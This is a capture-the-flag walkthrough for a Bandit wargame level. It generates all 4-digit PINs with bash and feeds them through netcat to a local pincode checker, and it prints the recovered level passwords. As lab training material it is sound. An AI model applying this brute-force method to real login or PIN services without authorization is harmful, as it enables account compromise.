In this challenge, I guess we have to create a wordlist in order to perform the bruteforce attack, so I had to make a temporary directory and use bash scripting to make one
```bash
bandit24@bandit:/tmp/bandd24$ for i in {0000..9999}; do echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 "$i >> delete; done
```
I tried to only use shell expansion and echo 
```bash
bandit24@bandit:/tmp/bandd24$ echo -e -n "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 "{0000..9999}"\n"
```
but strangely enough, It prints all lines witha leading space which changes the password value
Then, we ill open a netcat tcp connection the the specified port and redirect the passwords to it
```bash
bandit24@bandit:/tmp/bandd24$ nc 127.0.0.1 30002 < delete | grep -v rong
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
```
This command also has a pipe to grep so that it shows only non-Wrong outputs as we will have 9999 lines that say wrong!
